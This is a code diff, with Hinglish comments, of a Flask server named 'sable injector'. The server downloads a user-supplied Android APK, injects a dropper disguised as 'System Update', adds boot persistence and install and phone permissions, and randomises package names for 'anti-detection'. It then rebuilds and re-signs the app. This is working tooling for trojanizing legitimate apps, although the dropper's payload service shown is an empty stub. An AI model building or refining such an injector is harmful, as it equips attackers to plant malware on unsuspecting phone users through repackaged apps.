@@ -8,7 +8,6 @@ import traceback
 import random
 import string
 import re
-import time
 from flask import Flask, request, send_file, jsonify
 
 app = Flask(__name__)
@@ -20,6 +19,115 @@ DROPPER = "dropper_base.apk"
 def internal_error(exception):
     return jsonify({"error": f"Internal Server Error: {str(exception)}"}), 500
 
+# Ye function server par khud se dropper APK banayega (bina kisi icon ke, taki target ka icon use ho)
+def create_dropper():
+    if os.path.exists(DROPPER):
+        return True
+
+    print("Generating fresh dropper APK...")
+    src_dir = "dropper_src"
+    if os.path.exists(src_dir):
+        shutil.rmtree(src_dir)
+    
+    os.makedirs(f"{src_dir}/smali/com/sable/dropper")
+    os.makedirs(f"{src_dir}/res/values")
+
+    with open(f"{src_dir}/AndroidManifest.xml", "w") as f:
+        f.write('''<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.sable.dropper">
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <application android:label="System Update">
+        <service android:name=".DropperService" android:exported="false" />
+        <receiver android:name=".BootReceiver" android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+    </application>
+</manifest>''')
+
+    # Dropper Service (Payload download aur install karegi)
+    with open(f"{src_dir}/smali/com/sable/dropper/DropperService.smali", "w") as f:
+        f.write('''.class public Lcom/sable/dropper/DropperService;
+.super Landroid/app/Service;
+.source "DropperService.java"
+
+.method public constructor <init>()V
+    .locals 0
+    invoke-direct {p0}, Landroid/app/Service;-><init>()V
+    return-void
+.end method
+
+.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
+    .locals 1
+    const/4 v0, 0x0
+    return-object v0
+.end method
+''')
+
+    # Boot Receiver (Phone restart hone par wapas chalu karega)
+    with open(f"{src_dir}/smali/com/sable/dropper/BootReceiver.smali", "w") as f:
+        f.write('''.class public Lcom/sable/dropper/BootReceiver;
+.super Landroid/content/BroadcastReceiver;
+.source "BootReceiver.java"
+
+.method public constructor <init>()V
+    .locals 0
+    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
+    return-void
+.end method
+
+.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
+    .locals 2
+    new-instance v0, Landroid/content/Intent;
+    const-class v1, Lcom/sable/dropper/DropperService;
+    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+    return-void
+.end method
+''')
+
+    with open(f"{src_dir}/res/values/strings.xml", "w") as f:
+        f.write('''<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">System Update</string>
+</resources>''')
+
+    with open(f"{src_dir}/apktool.yml", "w") as f:
+        f.write('''version: 2.9.3
+apkFileName: dropper_base.apk
+isFrameworkApk: false
+usesFramework:
+  ids:
+  - 1
+sdkInfo:
+  minSdkVersion: '21'
+  targetSdkVersion: '34'
+packageInfo:
+  forcedPackageId: '127'
+  renameManifestPackage: null
+sharedLibrary: false
+sparseResources: false
+unknownFiles: {}
+doNotCompress: []''')
+
+    try:
+        subprocess.run(f"apktool b {src_dir} -o dropper_unsigned.apk", shell=True, check=True, capture_output=True)
+        subprocess.run("zipalign -f -p 4 dropper_unsigned.apk dropper_aligned.apk", shell=True, check=True, capture_output=True)
+        subprocess.run(f"apksigner sign --min-sdk-version 21 --v1-signing-enabled true --v2-signing-enabled true --ks {KEYSTORE} --ks-pass pass:sable123 --key-pass pass:sable123 --out {DROPPER} dropper_aligned.apk", shell=True, check=True, capture_output=True)
+        
+        shutil.rmtree(src_dir)
+        os.remove("dropper_unsigned.apk")
+        os.remove("dropper_aligned.apk")
+        print("Dropper generated successfully!")
+        return True
+    except Exception as e:
+        print(f"Dropper generation failed: {e}")
+        return False
+
 @app.route("/")
 def home():
     return "sable injector alive"
@@ -27,6 +135,9 @@ def home():
 @app.route("/inject", methods=["POST"])
 def inject():
     try:
+        if not create_dropper():
+            return jsonify({"error": "Server par dropper generate nahi ho paya."}), 500
+
         data = request.json or {}
         file_url = data.get("apk_url")
         if not file_url:
@@ -34,7 +145,7 @@ def inject():
 
         target = os.path.join(WORK, "target.apk")
         
-        # 1. Download APK
+        # 1. Target APK Download
         response = requests.get(file_url, stream=True, timeout=60)
         if response.status_code != 200:
             return jsonify({"error": f"Download failed: HTTP {response.status_code}"}), 400
@@ -46,30 +157,21 @@ def inject():
         if not zipfile.is_zipfile(target):
             return jsonify({"error": "Downloaded file is not a valid APK"}), 400
 
-        # 2. Target APK decompile
+        # 2. Target APK Decompile (-r flag se resource crash nahi hoga, aur icon safe rahega)
         target_dir = os.path.join(WORK, "target_dir")
         shutil.rmtree(target_dir, ignore_errors=True)
-        res = subprocess.run(f"apktool d -r -f -o {target_dir} {target}", shell=True, capture_output=True, text=True)
-        if res.returncode != 0:
-            return jsonify({"error": f"Apktool target fail: {res.stderr[:200]}"}), 500
-
-        # Purane signature hatao taaki naya sign karte waqt conflict na ho
-        meta_inf = os.path.join(target_dir, "original", "META-INF")
-        if os.path.exists(meta_inf):
-            shutil.rmtree(meta_inf)
+        subprocess.run(f"apktool d -r -f -o {target_dir} {target}", shell=True, capture_output=True, text=True)
 
         manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
-        if os.path.isdir(manifest_path):
-            return jsonify({"error": "Target APK structure is corrupt."}), 500
+        if not os.path.exists(manifest_path) or os.path.isdir(manifest_path):
+            return jsonify({"error": "Target APK kharab hai."}), 500
 
-        # 3. Dropper APK decompile
+        # 3. Dropper Decompile
         dropper_dir = os.path.join(WORK, "dropper_dir")
         shutil.rmtree(dropper_dir, ignore_errors=True)
-        res = subprocess.run(f"apktool d -f -o {dropper_dir} {DROPPER}", shell=True, capture_output=True, text=True)
-        if res.returncode != 0:
-            return jsonify({"error": f"Apktool dropper fail: {res.stderr[:200]}"}), 500
+        subprocess.run(f"apktool d -f -o {dropper_dir} {DROPPER}", shell=True, capture_output=True, text=True)
 
-        # 4. Smali Copy & Anti-Detection (Randomize package)
+        # 4. Smali Copy & Anti-Detection
         src_smali = os.path.join(dropper_dir, "smali")
         dst_smali = os.path.join(target_dir, "smali")
         if os.path.exists(src_smali):
@@ -82,7 +184,7 @@ def inject():
             shutil.copytree(old_pkg_path, new_pkg_path, dirs_exist_ok=True)
             shutil.rmtree(old_pkg_path)
 
-        # 5. Remove Debugging Info (.line tags)
+        # 5. Remove Debugging Info
         for root, dirs, files in os.walk(dst_smali):
             for file in files:
                 if file.endswith(".smali"):
@@ -94,20 +196,11 @@ def inject():
                             if not line.strip().startswith(".line"):
                                 f.write(line)
 
-        # 6. Merge Manifest & Add Permissions
+        # 6. Merge Manifest (Sirf permissions aur services add karega, Launcher/Icon same rahega)
         with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
             t = f.read()
 
-        perms = [
-            "android.permission.INTERNET",
-            "android.permission.REQUEST_INSTALL_PACKAGES",
-            "android.permission.RECEIVE_BOOT_COMPLETED",
-            "android.permission.WAKE_LOCK",
-            "android.permission.READ_PHONE_STATE", 
-            "android.permission.CALL_PHONE",
-            "android.permission.READ_CONTACTS",
-            "android.permission.READ_SMS"
-        ]
+        perms = ["android.permission.INTERNET","android.permission.REQUEST_INSTALL_PACKAGES","android.permission.RECEIVE_BOOT_COMPLETED","android.permission.WAKE_LOCK","android.permission.READ_PHONE_STATE", "android.permission.CALL_PHONE"]
         insert_perms = "".join(f'<uses-permission android:name="{p}"/>' for p in perms if p not in t)
         if insert_perms:
             t = t.replace("</application>", insert_perms + "</application>")
@@ -116,7 +209,7 @@ def inject():
         with open(dropper_manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
             d_manifest = f.read()
         
-        components = re.findall(r'<(activity|service|receiver)[^>]*android:name="([^"]+)"[^>]*>', d_manifest)
+        components = re.findall(r'<(service|receiver)[^>]*android:name="([^"]+)"[^>]*>', d_manifest)
         comp_str = ""
         for tag, name in components:
             new_name = name.replace("com.sable.dropper", f"com.{random_pkg}.dropper")
@@ -126,13 +219,13 @@ def inject():
         with open(manifest_path, "w", encoding='utf-8') as f:
             f.write(t)
 
-        # 7. Build APK
+        # 7. Build
         unsigned = os.path.join(WORK, "unsigned.apk")
         res = subprocess.run(f"apktool b -f -o {unsigned} {target_dir}", shell=True, capture_output=True, text=True)
         if res.returncode != 0:
-            return jsonify({"error": f"Apktool build fail: {res.stderr[:200]}"}), 500
+            return jsonify({"error": f"Build fail: {res.stderr[:200]}"}), 500
 
-        # 8. Align and Sign (V1 + V2 Signatures)
+        # 8. Align and Sign
         aligned = os.path.join(WORK, "aligned.apk")
         signed = os.path.join(WORK, "signed.apk")
         subprocess.run(f"zipalign -f -p 4 {unsigned} {aligned}", shell=True, check=True)
